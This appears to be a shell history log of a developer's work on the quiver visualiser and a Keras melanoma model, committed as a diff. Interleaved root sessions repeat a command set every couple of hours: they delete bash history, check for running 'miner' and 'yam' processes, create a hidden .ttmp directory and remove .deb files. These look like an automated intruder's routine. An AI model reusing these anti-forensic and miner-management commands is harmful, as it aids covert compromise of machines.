+python setup.py install ### @f5e57551b879 not a tty 20161223 08:45 /datamnt/github/quiver
+cd - ### @f5e57551b879 not a tty 20161223 08:45 /datamnt/github/quiver -> /datamnt/github/keras-cam-melanoma
+vi ../quiver/quiver_engine/server.py  ### @f5e57551b879 not a tty 20161223 08:45 /datamnt/github/keras-cam-melanoma
+top ### @f5e57551b879 not a tty 20161223 08:47 /notebooks
+/proc/meminfo ### @f5e57551b879 not a tty 20161223 08:47 /notebooks
+ls /proc/meminfo ### @f5e57551b879 not a tty 20161223 08:47 /notebooks
+cat /proc/meminfo ### @f5e57551b879 not a tty 20161223 08:47 /notebooks
+python cam.py --quiver True --model_path archiveweights-23dec/weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 09:22 /datamnt/github/keras-cam-melanoma
+vi ../quiver/quiver_engine/server.py  ### @f5e57551b879 not a tty 20161223 09:23 /datamnt/github/keras-cam-melanoma
+cd .. ### @f5e57551b879 not a tty 20161223 09:27 /notebooks -> /
+cd datamnt/github/keras-cam-melanoma/ ### @f5e57551b879 not a tty 20161223 09:28 / -> /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161223 09:28 /datamnt/github/keras-cam-melanoma
+cd .. ### @f5e57551b879 not a tty 20161223 09:28 /datamnt/github/keras-cam-melanoma -> /datamnt/github
+cd quiver/ ### @f5e57551b879 not a tty 20161223 09:28 /datamnt/github -> /datamnt/github/quiver
+ls ### @f5e57551b879 not a tty 20161223 09:28 /datamnt/github/quiver
+vi quiver_engine ### @f5e57551b879 not a tty 20161223 09:28 /datamnt/github/quiver
+vi quiver_engine ### @f5e57551b879 not a tty 20161223 09:30 /datamnt/github/quiver
+vi quiver_engine ### @f5e57551b879 not a tty 20161223 09:30 /datamnt/github/quiver
+vi quiver_engine ### @f5e57551b879 not a tty 20161223 09:31 /datamnt/github/quiver
+python cam.py --quiver True --model_path archiveweights-23dec/weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 09:31 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True --model_path archiveweights-23dec/weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 09:31 /datamnt/github/keras-cam-melanoma
+cd - ### @f5e57551b879 not a tty 20161223 09:31 /datamnt/github/keras-cam-melanoma -> /datamnt/github/quiver
+python setup.py install ### @f5e57551b879 not a tty 20161223 09:32 /datamnt/github/quiver
+cd - ### @f5e57551b879 not a tty 20161223 09:32 /datamnt/github/quiver -> /datamnt/github/keras-cam-melanoma
+cd - && python setup.py install && cd - ### @f5e57551b879 not a tty 20161223 09:32 /datamnt/github/quiver -> /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True --model_path archiveweights-23dec/weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 09:41 /datamnt/github/keras-cam-melanoma
+vi ../quiver/quiver_engine/server.py  ### @f5e57551b879 not a tty 20161223 10:06 /datamnt/github/keras-cam-melanoma
+cd - && python setup.py install && cd - ### @f5e57551b879 not a tty 20161223 10:07 /datamnt/github/quiver -> /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True --model_path archiveweights-23dec/weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 10:07 /datamnt/github/keras-cam-melanoma
+vi ../quiver/quiver_engine/server.py  ### @f5e57551b879 not a tty 20161223 10:07 /datamnt/github/keras-cam-melanoma
+cd - && python setup.py install && cd - ### @f5e57551b879 not a tty 20161223 10:07 /datamnt/github/quiver -> /datamnt/github/keras-cam-melanoma
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 10:19 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 10:19 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 10:19 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 10:19 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 10:19 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 10:19 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 10:19 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 10:19 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161223 10:20 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161223 10:20 /notebooks
+vi quiver_engine ### @f5e57551b879 not a tty 20161223 10:29 /datamnt/github/quiver
+python ### @f5e57551b879 not a tty 20161223 10:31 /datamnt/github/quiver
+pip install --upgrade Flask ### @f5e57551b879 not a tty 20161223 10:31 /datamnt/github/quiver
+cd - ### @f5e57551b879 not a tty 20161223 10:32 /datamnt/github/quiver -> /datamnt/github
+cd keras-cam-melanoma/ ### @f5e57551b879 not a tty 20161223 10:32 /datamnt/github -> /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161223 10:32 /datamnt/github/keras-cam-melanoma
+vi LOG  ### @f5e57551b879 not a tty 20161223 10:33 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True --model_path archiveweights-23dec/weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 10:33 /datamnt/github/keras-cam-melanoma
+cd - && python setup.py install && cd - ### @f5e57551b879 not a tty 20161223 10:33 /datamnt/github/quiver -> /datamnt/github/keras-cam-melanoma
+vi /usr/local/lib/python2.7/dist-packages/PIL/Image.py ### @f5e57551b879 not a tty 20161223 10:39 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161223 10:39 /datamnt/github/keras-cam-melanoma
+git status ### @f5e57551b879 not a tty 20161223 11:00 /datamnt/github/keras-cam-melanoma
+git commit -a -m "quiver fixes" ### @f5e57551b879 not a tty 20161223 11:01 /datamnt/github/keras-cam-melanoma
+git push ### @f5e57551b879 not a tty 20161223 11:01 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True --model_path archiveweights-23dec/weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 11:02 /datamnt/github/keras-cam-melanoma
+vi ../quiver/quiver_engine/util.py  ### @f5e57551b879 not a tty 20161223 11:03 /datamnt/github/keras-cam-melanoma
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 12:11 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 12:11 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 12:11 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 12:11 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 12:11 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 12:11 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 12:11 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 12:11 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161223 12:11 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161223 12:11 /notebooks
+vi ../quiver/quiver_engine/server.py  ### @f5e57551b879 not a tty 20161223 12:15 /datamnt/github/keras-cam-melanoma
+cd - && python setup.py install && cd - ### @f5e57551b879 not a tty 20161223 12:15 /datamnt/github/quiver -> /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True --model_path archiveweights-23dec/weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 12:21 /datamnt/github/keras-cam-melanoma
+python cam.py --quiver True --model_path archiveweights-23dec/weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 12:21 /datamnt/github/keras-cam-melanoma
+top ### @f5e57551b879 not a tty 20161223 12:21 /datamnt/github/keras-cam-melanoma
+cd - ### @f5e57551b879 not a tty 20161223 12:28 /datamnt/github/keras-cam-melanoma -> /datamnt/github
+cd quiver/ ### @f5e57551b879 not a tty 20161223 12:29 /datamnt/github -> /datamnt/github/quiver
+ls ### @f5e57551b879 not a tty 20161223 12:29 /datamnt/github/quiver
+git status ### @f5e57551b879 not a tty 20161223 12:29 /datamnt/github/quiver
+git add . ### @f5e57551b879 not a tty 20161223 12:29 /datamnt/github/quiver
+git status ### @f5e57551b879 not a tty 20161223 12:29 /datamnt/github/quiver
+vi LOG ### @f5e57551b879 not a tty 20161223 12:29 /datamnt/github/quiver
+vi LOG.rama ### @f5e57551b879 not a tty 20161223 12:31 /datamnt/github/quiver
+git add . ### @f5e57551b879 not a tty 20161223 12:31 /datamnt/github/quiver
+git commit -a -m "fix quiver for keras melanoma" ### @f5e57551b879 not a tty 20161223 12:31 /datamnt/github/quiver
+git status ### @f5e57551b879 not a tty 20161223 12:32 /datamnt/github/quiver
+git remote rename origin upstream ### @f5e57551b879 not a tty 20161223 12:32 /datamnt/github/quiver
+git remote add origin git@github.com:iweink/quiver.git ### @f5e57551b879 not a tty 20161223 12:34 /datamnt/github/quiver
+git push origin master ### @f5e57551b879 not a tty 20161223 12:34 /datamnt/github/quiver
+python cam.py --quiver True --model_path archiveweights-23dec/weights.35-loss0.177-acc0.908-valloss0.185-valacc0.914.hdf5  ### @f5e57551b879 not a tty 20161223 12:58 /datamnt/github/keras-cam-melanoma
+exit ### root@f5e57551b879 /dev/pts/0 20161223 14:10 /notebooks
+exit ### root@f5e57551b879 /dev/pts/0 20161223 14:10 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 14:10 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 14:10 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 14:10 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 14:10 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 14:10 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 14:10 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161223 14:10 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161223 14:10 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 15:41 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 15:41 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 15:41 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 15:41 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 15:41 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 15:41 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 15:41 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 15:41 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161223 15:41 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161223 15:41 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 17:11 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 17:11 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 17:11 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 17:11 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 17:11 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 17:11 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 17:11 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 17:12 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161223 17:12 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161223 17:12 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 18:38 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 18:38 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 18:38 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 18:38 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 18:38 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 18:38 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 18:38 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 18:38 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161223 18:38 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161223 18:38 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 20:02 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 20:02 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 20:02 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 20:02 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 20:02 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 20:02 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 20:03 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 20:03 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161223 20:03 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161223 20:03 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 21:26 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 21:26 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 21:26 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 21:26 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 21:26 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 21:26 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 21:26 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 21:26 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161223 21:26 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161223 21:26 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 22:56 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161223 22:56 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 22:56 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 22:56 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 22:56 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 22:56 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161223 22:56 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161223 22:56 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161223 22:56 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161223 22:56 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161224 00:39 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161224 00:39 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161224 00:39 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161224 00:39 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161224 00:39 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161224 00:39 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161224 00:39 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161224 00:39 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161224 00:39 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161224 00:39 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161224 02:37 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161224 02:37 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161224 02:37 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161224 02:37 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161224 02:37 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161224 02:37 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161224 02:37 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161224 02:37 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161224 02:37 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161224 02:37 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161224 04:29 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161224 04:29 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161224 04:29 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161224 04:29 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161224 04:29 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161224 04:29 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161224 04:29 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161224 04:29 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161224 04:29 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161224 04:29 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161224 06:18 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161224 06:18 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161224 06:18 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161224 06:18 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161224 06:18 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161224 06:18 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161224 06:18 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161224 06:18 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161224 06:18 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161224 06:18 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161224 08:14 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161224 08:14 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161224 08:14 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161224 08:14 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161224 08:14 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161224 08:14 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161224 08:14 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161224 08:14 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161224 08:14 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161224 08:14 /notebooks
+python cam.py --quiver True --model_path archiveweights-20Dec/weights.16-loss0.259-acc0.910-valloss0.272-valacc0.907.hdf5  ### @f5e57551b879 not a tty 20161224 09:17 /datamnt/github/keras-cam-melanoma
+cd - && python setup.py install && cd - ### @f5e57551b879 not a tty 20161224 09:17 /datamnt/github/quiver -> /datamnt/github/keras-cam-melanoma
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161224 10:04 /notebooks
+rm -f ~/.bash_history;exit  ### root@f5e57551b879 /dev/pts/0 20161224 10:05 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161224 10:05 /notebooks
+echo 'cpuinfolscpubjklllh8 START' && lscpu | head -15; echo 'cpuinfolscpubjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161224 10:05 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161224 10:05 /notebooks
+echo 'newIsRunninPrepsbjklllh8 START' && ps -e -o tty,pcpu,etime,cmd | grep miner | grep -v grep && ps -e -o tty,pcpu,etime,cmd | grep -i yam | grep -v grep; echo 'newIsRunninPrepsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161224 10:05 /notebooks
+clear ### root@f5e57551b879 /dev/pts/0 20161224 10:05 /notebooks
+echo 'kgreppsbjklllh8 START' && ps -e -o tty,pid,cmd | grep @ | grep -v grep; echo 'kgreppsbjklllh8 STOP' ### root@f5e57551b879 /dev/pts/0 20161224 10:05 /notebooks
+cd ~; cd; mkdir .ttmp; cd .ttmp; rm -f deb-cli; rm -Rf /.deb; rm -Rf ~/.deb;clear; ### root@f5e57551b879 /dev/pts/0 20161224 10:05 /root -> /root/.ttmp
+bash -i ### root@f5e57551b879 /dev/pts/0 20161224 10:05 /notebooks
+python cam.py --quiver True --model_path archiveweights-20Dec/weights.16-loss0.259-acc0.910-valloss0.272-valacc0.907.hdf5  ### @f5e57551b879 not a tty 20161224 10:53 /datamnt/github/keras-cam-melanoma
+ls ### @f5e57551b879 not a tty 20161224 10:53 /datamnt/github/keras-cam-melanoma
+vi cam.py  ### @f5e57551b879 not a tty 20161224 10:53 /datamnt/github/keras-cam-melanoma
